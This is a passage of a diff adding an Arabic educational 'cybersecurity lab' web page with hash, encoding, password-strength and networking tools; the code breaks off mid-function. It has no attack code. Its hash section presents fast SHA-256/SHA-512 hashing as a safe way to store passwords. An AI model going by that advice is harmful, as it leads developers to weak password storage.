@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>ESCNOR — مختبر الأمن السيبراني</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg0:#07090e;--bg1:#0b0e16;--bg2:#10141f;--bg3:#161c2a;
+  --cyan:#00d4ff;--green:#00ff88;--red:#ff3c5a;--orange:#ff8c00;--gold:#ffd700;
+  --txt:#e2e8f0;--txt2:#94a3b8;--txt3:#475569;--border:#1e2740;
+}
+html{scroll-behavior:smooth}
+body{font-family:'Cairo',sans-serif;background:var(--bg0);color:var(--txt);min-height:100vh}
+::-webkit-scrollbar{width:5px}
+::-webkit-scrollbar-track{background:var(--bg1)}
+::-webkit-scrollbar-thumb{background:var(--cyan);border-radius:3px}
+
+/* TOP BAR */
+.topbar{
+  position:sticky;top:0;z-index:100;
+  height:56px;background:rgba(7,9,14,.97);backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;padding:0 20px;gap:12px;
+}
+.back-btn{
+  background:rgba(0,212,255,.1);border:1px solid rgba(0,212,255,.3);
+  color:var(--cyan);font-family:'Cairo',sans-serif;font-size:.78rem;font-weight:700;
+  padding:6px 16px;border-radius:6px;cursor:pointer;text-decoration:none;
+  display:inline-flex;align-items:center;gap:6px;transition:background .2s;
+}
+.back-btn:hover{background:rgba(0,212,255,.2)}
+.tb-title{font-size:.85rem;font-weight:900;color:var(--txt)}
+.tb-title span{color:var(--cyan)}
+.tb-badge{font-size:.6rem;background:rgba(255,60,90,.15);border:1px solid rgba(255,60,90,.3);
+  color:var(--red);padding:2px 8px;border-radius:10px;font-weight:700;margin-right:auto}
+
+/* LAYOUT */
+.layout{display:grid;grid-template-columns:220px 1fr;min-height:calc(100vh - 56px)}
+@media(max-width:768px){.layout{grid-template-columns:1fr}}
+
+/* SIDEBAR */
+.sidebar{
+  background:var(--bg1);border-left:1px solid var(--border);
+  padding:16px 0;position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;
+}
+@media(max-width:768px){.sidebar{display:none}}
+.sb-label{font-size:.6rem;color:var(--txt3);text-transform:uppercase;letter-spacing:2px;
+  padding:0 14px;margin-bottom:6px;margin-top:16px;display:block}
+.sb-btn{
+  display:flex;align-items:center;gap:8px;width:100%;padding:9px 14px;
+  background:none;border:none;border-right:2px solid transparent;
+  color:var(--txt2);font-size:.78rem;font-family:'Cairo',sans-serif;
+  cursor:pointer;text-align:right;transition:all .2s;
+}
+.sb-btn:hover,.sb-btn.active{
+  background:rgba(0,212,255,.06);color:var(--cyan);border-right-color:var(--cyan);
+}
+.sb-icon{font-size:1rem;width:20px;text-align:center}
+
+/* MAIN */
+.main{padding:28px 32px;max-width:900px}
+@media(max-width:768px){.main{padding:16px}}
+
+/* SECTION */
+.section{display:none}
+.section.active{display:block}
+.section-header{margin-bottom:24px}
+.section-tag{font-size:.62rem;color:var(--red);letter-spacing:3px;text-transform:uppercase;
+  font-family:'JetBrains Mono',monospace;margin-bottom:6px}
+.section-title{font-size:1.4rem;font-weight:900}
+.section-title span{color:var(--cyan)}
+.section-desc{font-size:.82rem;color:var(--txt2);margin-top:6px;line-height:1.7}
+
+/* CARD */
+.card{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:22px;margin-bottom:16px}
+.card-title{font-size:.88rem;font-weight:700;color:var(--cyan);margin-bottom:6px;display:flex;align-items:center;gap:8px}
+.card-desc{font-size:.75rem;color:var(--txt2);margin-bottom:14px;line-height:1.7}
+.inp{
+  width:100%;background:var(--bg3);border:1px solid var(--border);
+  color:var(--txt);border-radius:6px;padding:9px 12px;
+  font-family:'JetBrains Mono',monospace;font-size:.8rem;
+  outline:none;margin-bottom:8px;transition:border-color .2s;
+}
+.inp:focus{border-color:var(--cyan)}
+.inp-area{
+  width:100%;background:var(--bg3);border:1px solid var(--border);
+  color:var(--txt);border-radius:6px;padding:10px 12px;
+  font-family:'JetBrains Mono',monospace;font-size:.78rem;
+  outline:none;margin-bottom:8px;resize:vertical;min-height:80px;
+  line-height:1.6;transition:border-color .2s;
+}
+.inp-area:focus{border-color:var(--cyan)}
+.btn{
+  background:linear-gradient(135deg,var(--cyan),var(--green));
+  color:#000;font-weight:900;font-size:.78rem;padding:8px 20px;
+  border-radius:6px;border:none;cursor:pointer;font-family:'Cairo',sans-serif;
+  transition:opacity .2s;display:inline-flex;align-items:center;gap:6px;
+}
+.btn:hover{opacity:.85}
+.btn-red{background:linear-gradient(135deg,var(--red),var(--orange))}
+.btn-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+.result{
+  background:#000;border:1px solid var(--border);border-radius:6px;
+  padding:12px;font-family:'JetBrains Mono',monospace;font-size:.75rem;
+  color:var(--green);min-height:50px;margin-top:10px;
+  white-space:pre-wrap;line-height:1.7;word-break:break-all;
+}
+.result.hidden{display:none}
+
+/* HASH */
+.hash-row{background:#000;border:1px solid var(--border);border-radius:6px;
+  padding:10px 12px;margin-bottom:8px}
+.hash-algo{font-size:.6rem;color:var(--txt3);text-transform:uppercase;letter-spacing:1px;margin-bottom:3px}
+.hash-val{font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--green);
+  word-break:break-all;cursor:pointer;transition:color .2s}
+.hash-val:hover{color:var(--cyan)}
+
+/* PASSWORD STRENGTH */
+.strength-bar{height:6px;background:var(--bg3);border-radius:3px;margin:10px 0;overflow:hidden}
+.strength-fill{height:100%;width:0%;border-radius:3px;transition:all .3s}
+.strength-label{font-size:.8rem;font-weight:700;margin-bottom:8px}
+.check-list{list-style:none;font-size:.76rem;color:var(--txt2);line-height:2}
+.check-list li::before{content:'✗ ';color:var(--red)}
+.check-list li.ok::before{content:'✓ ';color:var(--green)}
+.check-list li.ok{color:var(--txt)}
+
+/* PORTS TABLE */
+.ports-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;margin-top:8px}
+.port-item{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:10px 12px}
+.port-num{font-family:'JetBrains Mono',monospace;font-size:.85rem;font-weight:700;color:var(--cyan)}
+.port-proto{font-size:.65rem;color:var(--txt3);text-transform:uppercase;letter-spacing:1px}
+.port-desc{font-size:.72rem;color:var(--txt2);margin-top:2px}
+
+/* NETWORK */
+.net-concept{border-right:2px solid var(--cyan);padding:10px 14px;margin-bottom:12px;background:rgba(0,212,255,.04);border-radius:0 8px 8px 0}
+.net-title{font-size:.82rem;font-weight:700;color:var(--cyan);margin-bottom:4px}
+.net-desc{font-size:.75rem;color:var(--txt2);line-height:1.8}
+
+/* WARNING */
+.warning-box{
+  background:rgba(255,60,90,.05);border:1px solid rgba(255,60,90,.2);
+  border-radius:8px;padding:14px;margin-top:20px;font-size:.76rem;color:var(--txt2);line-height:1.8;
+}
+.warning-box strong{color:var(--red)}
+
+/* TABS MOBILE */
+.mobile-tabs{display:none;flex-wrap:wrap;gap:6px;margin-bottom:20px}
+@media(max-width:768px){.mobile-tabs{display:flex}}
+.mob-tab{padding:7px 14px;border-radius:6px;background:var(--bg2);border:1px solid var(--border);
+  color:var(--txt2);font-size:.72rem;font-weight:700;cursor:pointer;font-family:'Cairo',sans-serif}
+.mob-tab.active{border-color:var(--cyan);color:var(--cyan)}
+
+/* STATUS CODES */
+.status-item{display:flex;align-items:flex-start;gap:12px;padding:10px 0;border-bottom:1px solid var(--border)}
+.status-code{font-family:'JetBrains Mono',monospace;font-size:.9rem;font-weight:700;min-width:50px}
+.status-name{font-size:.8rem;font-weight:700;margin-bottom:2px}
+.status-desc{font-size:.72rem;color:var(--txt2)}
+.s2xx{color:var(--green)}.s3xx{color:var(--cyan)}.s4xx{color:var(--orange)}.s5xx{color:var(--red)}
+
+/* HEADER SECURITY */
+.header-item{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:10px}
+.header-name{font-family:'JetBrains Mono',monospace;font-size:.78rem;color:var(--cyan);margin-bottom:4px}
+.header-desc{font-size:.73rem;color:var(--txt2);line-height:1.7}
+.header-example{font-family:'JetBrains Mono',monospace;font-size:.68rem;color:var(--green);
+  margin-top:6px;background:#000;padding:6px 8px;border-radius:4px;word-break:break-all}
+</style>
+</head>
+<body>
+
+<!-- TOP BAR -->
+<div class="topbar">
+  <a href="dashboard.html" class="back-btn">← الموقع</a>
+  <span class="tb-title">مختبر <span>الأمن السيبراني</span></span>
+  <span class="tb-badge">للتعلم فقط ⚠️</span>
+</div>
+
+<!-- LAYOUT -->
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <span class="sb-label">الأدوات</span>
+    <button class="sb-btn active" onclick="show('hash',this)"><span class="sb-icon">🔐</span>Hash Generator</button>
+    <button class="sb-btn" onclick="show('encode',this)"><span class="sb-icon">📝</span>Encode / Decode</button>
+    <button class="sb-btn" onclick="show('password',this)"><span class="sb-icon">🔑</span>قوة كلمة المرور</button>
+    <button class="sb-label" style="display:block;margin-top:16px">الشبكات</button>
+    <button class="sb-btn" onclick="show('ports',this)"><span class="sb-icon">🔌</span>المنافذ الشائعة</button>
+    <button class="sb-btn" onclick="show('http',this)"><span class="sb-icon">📋</span>HTTP Headers</button>
+    <button class="sb-btn" onclick="show('ip',this)"><span class="sb-icon">🌍</span>معلومات IP</button>
+    <span class="sb-label">المفاهيم</span>
+    <button class="sb-btn" onclick="show('network',this)"><span class="sb-icon">🕸️</span>أساسيات الشبكات</button>
+    <button class="sb-btn" onclick="show('attacks',this)"><span class="sb-icon">⚔️</span>أنواع الهجمات</button>
+  </aside>
+
+  <!-- MAIN -->
+  <main class="main">
+
+    <!-- MOBILE TABS -->
+    <div class="mobile-tabs">
+      <button class="mob-tab active" onclick="show('hash',this)">🔐 Hash</button>
+      <button class="mob-tab" onclick="show('encode',this)">📝 Encode</button>
+      <button class="mob-tab" onclick="show('password',this)">🔑 Password</button>
+      <button class="mob-tab" onclick="show('ports',this)">🔌 Ports</button>
+      <button class="mob-tab" onclick="show('http',this)">📋 HTTP</button>
+      <button class="mob-tab" onclick="show('ip',this)">🌍 IP</button>
+      <button class="mob-tab" onclick="show('network',this)">🕸️ شبكات</button>
+      <button class="mob-tab" onclick="show('attacks',this)">⚔️ هجمات</button>
+    </div>
+
+    <!-- ═══ HASH ═══ -->
+    <div id="sec-hash" class="section active">
+      <div class="section-header">
+        <div class="section-tag">// أداة تشفير</div>
+        <h2 class="section-title">🔐 Hash <span>Generator</span></h2>
+        <p class="section-desc">حوّل أي نص لـ Hash — يُستخدم في تشفير كلمات المرور وحفظها بأمان في قواعد البيانات</p>
+      </div>
+      <div class="card">
+        <div class="card-title">🔐 توليد Hash</div>
+        <div class="card-desc">اكتب أي نص وسيظهر الـ Hash الخاص به بعدة خوارزميات مختلفة. الـ Hash أحادي الاتجاه — لا يمكن عكسه.</div>
+        <input class="inp" id="hashInput" type="text" placeholder="اكتب النص هنا..." oninput="generateHash()"/>
+        <div id="hashResults">
+          <div class="hash-row"><div class="hash-algo">MD5 (ضعيف — لا تستخدمه للأمان)</div><div class="hash-val" id="h-md5" title="اضغط للنسخ">—</div></div>
+          <div class="hash-row"><div class="hash-algo">SHA-1 (ضعيف — مخترق)</div><div class="hash-val" id="h-sha1" title="اضغط للنسخ">—</div></div>
+          <div class="hash-row"><div class="hash-algo">SHA-256 ✅ (مناسب للاستخدام)</div><div class="hash-val" id="h-sha256" title="اضغط للنسخ">—</div></div>
+          <div class="hash-row"><div class="hash-algo">SHA-512 ✅ (الأقوى)</div><div class="hash-val" id="h-sha512" title="اضغط للنسخ">—</div></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">📚 ما هو الـ Hash؟</div>
+        <div style="font-size:.8rem;color:var(--txt2);line-height:2">
+          <p>الـ <strong style="color:var(--cyan)">Hash</strong> هو دالة رياضية تحول أي نص لسلسلة ثابتة الطول من الأحرف والأرقام.</p>
+          <br/>
+          <p><strong style="color:var(--green)">خصائص الـ Hash:</strong></p>
+          <ul style="padding-right:16px;margin-top:8px">
+            <li>✅ نفس المدخل دايماً يعطي نفس الناتج</li>
+            <li>✅ أي تغيير صغير يغير الناتج كلياً</li>
+            <li>✅ لا يمكن الرجوع للنص الأصلي من الـ Hash</li>
+            <li>✅ سريع الحساب جداً</li>
+          </ul>
+          <br/>
+          <p><strong style="color:var(--red)">تحذير:</strong> MD5 و SHA-1 مكسورتان — لا تستخدمهما في أي تطبيق جديد. استخدم SHA-256 أو SHA-512.</p>
+        </div>
+      </div>
+      <div class="warning-box">⚠️ <strong>تذكر:</strong> هذه الأداة للتعلم فقط. لا تستخدم الـ Hashing لكسر كلمات مرور الآخرين.</div>
+    </div>
+
+    <!-- ═══ ENCODE ═══ -->
+    <div id="sec-encode" class="section">
+      <div class="section-header">
+        <div class="section-tag">// أداة ترميز</div>
+        <h2 class="section-title">📝 Encode / <span>Decode</span></h2>
+        <p class="section-desc">تحويل النصوص بين صيغ مختلفة — Base64 و URL Encoding و Hex</p>
+      </div>
+      <div class="card">
+        <div class="card-title">📝 Base64</div>
+        <div class="card-desc">Base64 يُستخدم في JWT tokens، تشفير الملفات، وإرسال البيانات عبر HTTP. ليس تشفيراً — يمكن عكسه بسهولة!</div>
+        <input class="inp" id="b64input" type="text" placeholder="اكتب النص..."/>
+        <div class="btn-row">
+          <button class="btn" onclick="b64encode()">Encode ←</button>
+          <button class="btn btn-red" onclick="b64decode()">→ Decode</button>
+        </div>
+        <div class="result" id="b64result">// النتيجة هنا...</div>
+      </div>
+      <div class="card">
+        <div class="card-title">🔗 URL Encoding</div>
+        <div class="card-desc">URL Encoding يحول الرموز الخاصة لصيغة آمنة في الروابط. مهم جداً في اختبار SQL Injection و XSS.</div>
+        <input class="inp" id="urlinput" type="text" placeholder="مثال: hello world &amp; test=1"/>
+        <div class="btn-row">
+          <button class="btn" onclick="urlencode()">URL Encode ←</button>
+          <button class="btn btn-red" onclick="urldecode()">→ Decode</button>
+        </div>
+        <div class="result" id="urlresult">// النتيجة هنا...</div>
+      </div>
+      <div class="card">
+        <div class="card-title">🔢 Hex Encoding</div>
+        <div class="card-desc">تحويل النص لصيغة Hexadecimal — يُستخدم في تحليل الذاكرة والبروتوكولات الشبكية.</div>
+        <input class="inp" id="hexinput" type="text" placeholder="اكتب النص..."/>
+        <div class="btn-row">
+          <button class="btn" onclick="hexencode()">→ Hex</button>
+          <button class="btn btn-red" onclick="hexdecode()">Hex →</button>
+        </div>
+        <div class="result" id="hexresult">// النتيجة هنا...</div>
+      </div>
+    </div>
+
+    <!-- ═══ PASSWORD ═══ -->
+    <div id="sec-password" class="section">
+      <div class="section-header">
+        <div class="section-tag">// تحليل أمني</div>
+        <h2 class="section-title">🔑 قوة <span>كلمة المرور</span></h2>
+        <p class="section-desc">افهم ما يجعل كلمة المرور قوية وكم تستغرق اختراقها</p>
+      </div>
+      <div class="card">
+        <div class="card-title">🔑 تحليل كلمة المرور</div>
+        <input class="inp" id="passInput" type="text" placeholder="اكتب كلمة مرور للتحليل..." oninput="analyzePass()"/>
+        <div class="strength-bar"><div class="strength-fill" id="strengthFill"></div></div>
+        <div class="strength-label" id="strengthLabel">—</div>
+        <ul class="check-list" id="checkList">
+          <li id="chk-len">8 حروف على الأقل</li>
+          <li id="chk-upper">حروف كبيرة (A-Z)</li>
+          <li id="chk-lower">حروف صغيرة (a-z)</li>
+          <li id="chk-num">أرقام (0-9)</li>
+          <li id="chk-sym">رموز خاصة (!@#$...)</li>
+          <li id="chk-long">16 حرف أو أكثر (ممتاز)</li>
+        </ul>
+      </div>
+      <div class="card">
+        <div class="card-title">⏱️ وقت الاختراق التقريبي</div>
+        <div id="crackTime" style="font-size:.8rem;color:var(--txt2);line-height:2.2">اكتب كلمة مرور أولاً...</div>
+      </div>
+      <div class="card">
+        <div class="card-title">🛡️ نصائح لكلمة مرور قوية</div>
+        <ul style="font-size:.78rem;color:var(--txt2);line-height:2.2;padding-right:16px">
+          <li>✅ استخدم 16 حرف على الأقل</li>
+          <li>✅ امزج أحرف كبيرة وصغيرة وأرقام ورموز</li>
+          <li>✅ استخدم Password Manager (Bitwarden مجاني)</li>
+          <li>✅ كلمة مرور مختلفة لكل موقع</li>
+          <li>✅ فعّل المصادقة الثنائية (2FA) دايماً</li>
+          <li>❌ لا تستخدم معلوماتك الشخصية</li>
+          <li>❌ لا تستخدم كلمات موجودة في القاموس</li>
+          <li>❌ لا تكرر نفس الباسورد في أكثر من موقع</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- ═══ PORTS ═══ -->
+    <div id="sec-ports" class="section">
+      <div class="section-header">
+        <div class="section-tag">// شبكات</div>
+        <h2 class="section-title">🔌 المنافذ <span>الشائعة</span></h2>
+        <p class="section-desc">معرفة المنافذ وبروتوكولاتها أساسية في فهم الشبكات واختبار الاختراق</p>
+      </div>
+      <div class="card">
+        <div class="card-title">🔍 البحث عن منفذ</div>
+        <input class="inp" id="portQuery" type="number" placeholder="أدخل رقم المنفذ مثل: 443" style="max-width:300px"/>
+        <button class="btn" onclick="lookupPort()">🔍 بحث</button>
+        <div class="result" id="portResult" style="display:none"></div>
+      </div>
+      <div class="card">
+        <div class="card-title">📋 المنافذ الأكثر استخداماً</div>
+        <div class="ports-grid" id="portsGrid"></div>
+      </div>
+    </div>
+
+    <!-- ═══ HTTP ═══ -->
+    <div id="sec-http" class="section">
+      <div class="section-header">
+        <div class="section-tag">// بروتوكول</div>
+        <h2 class="section-title">📋 HTTP <span>Headers</span></h2>
+        <p class="section-desc">أكواد استجابة HTTP والـ Headers الأمنية المهمة</p>
+      </div>
+      <div class="card">
+        <div class="card-title">🔍 بحث في أكواد HTTP</div>
+        <input class="inp" id="statusQuery" type="number" placeholder="أدخل كود مثل: 200 أو 404" style="max-width:280px"/>
+        <button class="btn" onclick="lookupStatus()">🔍 بحث</button>
+        <div class="result" id="statusResult" style="display:none"></div>
+      </div>
+      <div class="card">
+        <div class="card-title">📊 أكواد الاستجابة الشائعة</div>
+        <div id="statusList"></div>
+      </div>
+      <div class="card">
+        <div class="card-title">🔐 Security Headers المهمة</div>
+        <div id="secHeaders"></div>
+      </div>
+    </div>
+
+    <!-- ═══ IP ═══ -->
+    <div id="sec-ip" class="section">
+      <div class="section-header">
+        <div class="section-tag">// شبكات</div>
+        <h2 class="section-title">🌍 معلومات <span>IP</span></h2>
+        <p class="section-desc">معلومات الـ IP وكيفية عمل العناوين الشبكية</p>
+      </div>
+      <div class="card">
+        <div class="card-title">🔍 معلومات IP جهازك</div>
+        <div class="card-desc">هذا ما يراه أي موقع تزوره عنك</div>
+        <button class="btn" onclick="getMyIP()" id="ipBtn">🔍 اعرف IP جهازك</button>
+        <div class="result" id="ipResult" style="display:none;margin-top:12px"></div>
+      </div>
+      <div class="card">
+        <div class="card-title">📚 أنواع عناوين IP</div>
+        <div style="font-size:.78rem;color:var(--txt2);line-height:2.2">
+          <p><strong style="color:var(--cyan)">IPv4:</strong> 32 bit — مثال: 192.168.1.1 — 4 مليار عنوان (انتهت تقريباً)</p>
+          <p><strong style="color:var(--cyan)">IPv6:</strong> 128 bit — مثال: 2001:db8::1 — عدد لا نهاية له</p>
+          <br/>
+          <p><strong style="color:var(--green)">Private IP (شبكتك المحلية):</strong></p>
+          <ul style="padding-right:16px">
+            <li>10.0.0.0 — 10.255.255.255</li>
+            <li>172.16.0.0 — 172.31.255.255</li>
+            <li>192.168.0.0 — 192.168.255.255</li>
+          </ul>
+          <br/>
+          <p><strong style="color:var(--orange)">Special:</strong></p>
+          <ul style="padding-right:16px">
+            <li>127.0.0.1 = localhost (جهازك نفسه)</li>
+            <li>0.0.0.0 = كل العناوين</li>
+            <li>255.255.255.255 = Broadcast</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══ NETWORK ═══ -->
+    <div id="sec-network" class="section">
+      <div class="section-header">
+        <div class="section-tag">// مفاهيم أساسية</div>
+        <h2 class="section-title">🕸️ أساسيات <span>الشبكات</span></h2>
+        <p class="section-desc">المفاهيم الأساسية التي يجب أن يعرفها كل متخصص في الأمن السيبراني</p>
+      </div>
+      <div id="networkConcepts"></div>
+    </div>
+
+    <!-- ═══ ATTACKS ═══ -->
+    <div id="sec-attacks" class="section">
+      <div class="section-header">
+        <div class="section-tag">// تعليمي</div>
+        <h2 class="section-title">⚔️ أنواع <span>الهجمات</span></h2>
+        <p class="section-desc">تعرّف على أنواع الهجمات الإلكترونية — لفهمها وحماية نفسك منها</p>
+      </div>
+      <div id="attacksList"></div>
+      <div class="warning-box">
+        ⚠️ <strong>تحذير قانوني:</strong> تطبيق هذه الهجمات على أنظمة أو مواقع بدون إذن صريح يُعدّ جريمة يعاقب عليها القانون في جميع دول العالم. هذه المعلومات للتعلم والحماية فقط.
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<script>
+// ═══════════════════════════════════════
+//  NAVIGATION
+// ═══════════════════════════════════════
+function show(name, btn) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.sb-btn, .mob-tab').forEach(b => b.classList.remove('active'));
+  document.getElementById('sec-' + name).classList.add('active');
+  if(btn) btn.classList.add('active');
+}
+
+// ═══════════════════════════════════════
+//  HASH GENERATOR (Web Crypto API)
+// ═══════════════════════════════════════
+async function sha(algo, text) {
+  const enc = new TextEncoder().encode(text);
+  const buf = await crypto.subtle.digest(algo, enc);
+  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+// Simple MD5 implementation
+function md5(str) {
+  function safeAdd(x, y) {
+    const lsw = (x & 0xffff) + (y & 0xffff);
+    return (((x >> 16) + (y >> 16) + (lsw >> 16)) << 16) | (lsw & 0xffff);
+  }
+  function bitRotateLeft(num, cnt) { return (num << cnt) | (num >>> (32 - cnt)); }
+  function md5cmn(q, a, b, x, s, t) { return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b); }
+  function md5ff(a,b,c,d,x,s,t){return md5cmn((b&c)|((~b)&d),a,b,x,s,t)}
+  function md5gg(a,b,c,d,x,s,t){return md5cmn((b&d)|(c&(~d)),a,b,x,s,t)}
+  function md5hh(a,b,c,d,x,s,t){return md5cmn(b^c^d,a,b,x,s,t)}
+  function md5ii(a,b,c,d,x,s,t){return md5cmn(c^(b|(~d)),a,b,x,s,t)}
+
+  const bytes = unescape(encodeURIComponent(str));
+  const len = bytes.length;
+  const words = [];
+  for(let i=0;i<len;i++) words[i>>2] |= bytes.charCodeAt(i) << ((i%4)*8);
+  words[len>>2] |= 0x80 << ((len%4)*8);
+  words[(((len+8)>>6)<<4)+14] = len*8;
+
+  let a=1732584193,b=-271733879,c=-1732584194,d=271733878;
+  for(let i=0;i<words.length;i+=16){
+    const [oa,ob,oc,od]=[a,b,c,d];
+    a=md5ff(a,b,c,d,words[i],7,-680876936); d=md5ff(d,a,b,c,words[i+1],12,-389564586);
+    c=md5ff(c,d,a,b,words[i+2],17,606105819); b=md5ff(b,c,d,a,words[i+3],22,-1044525330);
+    a=md5ff(a,b,c,d,words[i+4],7,-176418897); d=md5ff(d,a,b,c,words[i+5],12,1200080426);
+    c=md5ff(c,d,a,b,words[i+6],17,-1473231341); b=md5ff(b,c,d,a,words[i+7],22,-45705983);
+    a=md5ff(a,b,c,d,words[i+8],7,1770035416); d=md5ff(d,a,b,c,words[i+9],12,-1958414417);
+    c=md5ff(c,d,a,b,words[i+10],17,-42063); b=md5ff(b,c,d,a,words[i+11],22,-1990404162);
+    a=md5ff(a,b,c,d,words[i+12],7,1804603682); d=md5ff(d,a,b,c,words[i+13],12,-40341101);
+    c=md5ff(c,d,a,b,words[i+14],17,-1502002290); b=md5ff(b,c,d,a,words[i+15],22,1236535329);
+    a=md5gg(a,b,c,d,words[i+1],5,-165796510); d=md5gg(d,a,b,c,words[i+6],9,-1069501632);
+    c=md5gg(c,d,a,b,words[i+11],14,643717713); b=md5gg(b,c,d,a,words[i],20,-373897302);
+    a=md5gg(a,b,c,d,words[i+5],5,-701558691); d=md5gg(d,a,b,c,words[i+10],9,38016083);
+    c=md5gg(c,d,a,b,words[i+15],14,-660478335); b=md5gg(b,c,d,a,words[i+4],20,-405537848);
+    a=md5gg(a,b,c,d,words[i+9],5,568446438); d=md5gg(d,a,b,c,words[i+14],9,-1019803690);
+    c=md5gg(c,d,a,b,words[i+3],14,-187363961); b=md5gg(b,c,d,a,words[i+8],20,1163531501);
+    a=md5gg(a,b,c,d,words[i+13],5,-1444681467); d=md5gg(d,a,b,c,words[i+2],9,-51403784);
+    c=md5gg(c,d,a,b,words[i+7],14,1735328473); b=md5gg(b,c,d,a,words[i+12],20,-1926607734);
+    a=md5hh(a,b,c,d,words[i+5],4,-378558); d=md5hh(d,a,b,c,words[i+8],11,-2022574463);
+    c=md5hh(c,d,a,b,words[i+11],16,1839030562); b=md5hh(b,c,d,a,words[i+14],23,-35309556);
+    a=md5hh(a,b,c,d,words[i+1],4,-1530992060); d=md5hh(d,a,b,c,words[i+4],11,1272893353);
+    c=md5hh(c,d,a,b,words[i+7],16,-155497632); b=md5hh(b,c,d,a,words[i+10],23,-1094730640);
+    a=md5hh(a,b,c,d,words[i+13],4,681279174); d=md5hh(d,a,b,c,words[i],11,-358537222);
+    c=md5hh(c,d,a,b,words[i+3],16,-722521979); b=md5hh(b,c,d,a,words[i+6],23,76029189);
+    a=md5hh(a,b,c,d,words[i+9],4,-640364487); d=md5hh(d,a,b,c,words[i+12],11,-421815835);
+    c=md5hh(c,d,a,b,words[i+15],16,530742520); b=md5hh(b,c,d,a,words[i+2],23,-995338651);
+    a=md5ii(a,b,c,d,words[i],6,-198630844); d=md5ii(d,a,b,c,words[i+7],10,1126891415);
+    c=md5ii(c,d,a,b,words[i+14],15,-1416354905); b=md5ii(b,c,d,a,words[i+5],21,-57434055);
+    a=md5ii(a,b,c,d,words[i+12],6,1700485571); d=md5ii(d,a,b,c,words[i+3],10,-1894986606);
+    c=md5ii(c,d,a,b,words[i+10],15,-1051523); b=md5ii(b,c,d,a,words[i+1],21,-2054922799);
+    a=md5ii(a,b,c,d,words[i+8],6,1873313359); d=md5ii(d,a,b,c,words[i+15],10,-30611744);
+    c=md5ii(c,d,a,b,words[i+6],15,-1560198380); b=md5ii(b,c,d,a,words[i+13],21,1309151649);
+    a=md5ii(a,b,c,d,words[i+4],6,-145523070); d=md5ii(d,a,b,c,words[i+11],10,-1120210379);
+    c=md5ii(c,d,a,b,words[i+2],15,718787259); b=md5ii(b,c,d,a,words[i+9],21,-343485551);
+    a=safeAdd(a,oa);b=safeAdd(b,ob);c=safeAdd(c,oc);d=safeAdd(d,od);
+  }
+  return [a,b,c,d].map(n=>(n>>>0).toString(16).padStart(8,'0').match(/../g).reverse().join('')).join('');
+}
+
+async function generateHash() {
+  const text = document.getElementById('hashInput').value;
+  if(!text) {
+    ['md5','sha1','sha256','sha512'].forEach(id => document.getElementById('h-'+id).textContent = '—');
+    return;
+  }
+  document.getElementById('h-md5').textContent = md5(text);
+  document.getElementById('h-sha1').textContent = await sha('SHA-1', text);
+  document.getElementById('h-sha256').textContent = await sha('SHA-256', text);
+  document.getElementById('h-sha512').textContent = await sha('SHA-512', text);
+}
+
+// Copy on click
+document.querySelectorAll('.hash-val').forEach(el => {
+  el.addEventListener('click', () => {
+    navigator.clipboard.writeText(el.textContent).then(() => {
+      const old = el.textContent;
+      el.textContent = '✅ تم النسخ!';
+      setTimeout(() => el.textContent = old, 1500);
+    });
+  });
+});
+
+// ═══════════════════════════════════════
+//  ENCODE / DECODE
+// ═══════════════════════════════════════
+function b64encode() {
+  try {
+    const v = document.getElementById('b64input').value;
+    document.getElementById('b64result').textContent = btoa(unescape(encodeURIComponent(v)));
+    document.getElementById('b64result').style.display = 'block';
+  } catch(e) { document.getElementById('b64result').textContent = '❌ خطأ: ' + e.message; }
+}
+function b64decode() {
+  try {
+    const v = document.getElementById('b64input').value;
+    document.getElementById('b64result').textContent = decodeURIComponent(escape(atob(v)));
+    document.getElementById('b64result').style.display = 'block';
+  } catch(e) { document.getElementById('b64result').textContent = '❌ النص ليس Base64 صحيح'; document.getElementById('b64result').style.display='block'; }
+}
+function urlencode() {
+  const v = document.getElementById('urlinput').value;
+  document.getElementById('urlresult').textContent = encodeURIComponent(v);
+  document.getElementById('urlresult').style.display = 'block';
+}
+function urldecode() {
+  try {
+    const v = document.getElementById('urlinput').value;
+    document.getElementById('urlresult').textContent = decodeURIComponent(v);
+    document.getElementById('urlresult').style.display = 'block';
+  } catch(e) { document.getElementById('urlresult').textContent = '❌ خطأ في فك التشفير'; document.getElementById('urlresult').style.display='block'; }
+}
+function hexencode() {
+  const v = document.getElementById('hexinput').value;
+  const hex = Array.from(v).map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
+  document.getElementById('hexresult').textContent = hex;
+  document.getElementById('hexresult').style.display = 'block';
+}
+function hexdecode() {
+  try {
+    const v = document.getElementById('hexinput').value.replace(/\s/g,'');
+    const text = v.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b,16))).join('');
+    document.getElementById('hexresult').textContent = text;
+    document.getElementById('hexresult').style.display = 'block';
+  } catch(e) { document.getElementById('hexresult').textContent = '❌ تأكد من صحة الـ Hex'; document.getElementById('hexresult').style.display='block'; }
+}
+
+// ═══════════════════════════════════════
+//  PASSWORD STRENGTH
+// ═══════════════════════════════════════
+function analyzePass() {
+  const pass = document.getElementById('passInput').value;
+  const checks = {
